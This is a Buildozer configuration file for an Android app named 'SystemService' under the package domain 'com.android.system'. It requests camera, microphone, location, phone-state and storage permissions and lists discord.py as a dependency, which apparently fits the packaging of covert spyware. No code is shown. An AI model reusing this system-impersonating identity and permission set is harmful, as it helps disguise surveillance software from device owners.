[app]
title = SystemService
package.name = systemservice
package.domain = com.android.system

source.dir = .
source.include_exts = py,png,jpg,kv,atlas,txt

version = 1.0
requirements = python3,openssl,requests,pillow,discord.py,pyjnius,kivy

orientation = portrait
osx.python_version = 3
osx.kivy_version = 2.1.0

android.permissions = INTERNET,ACCESS_NETWORK_STATE,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,RECORD_AUDIO,CAMERA,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,ACCESS_WIFI_STATE,READ_PHONE_STATE,WAKE_LOCK

android.api = 30
android.minapi = 24
android.ndk = 23b
android.sdk = 33
android.ndk_api = 21

presplash.filename = %(source.dir)s/assets/presplash.png
icon.filename = %(source.dir)s/assets/icon.png

android.arch = arm64-v8a,armeabi-v7a

# Add any additional dependencies
p4a.branch = develop
android.add_src = ./assets

# Add additional Java files if needed
android.add_java_files = 

# Add additional activities
android.manifest.activities = 
android.manifest.application = 

[buildozer]
log_level = 2
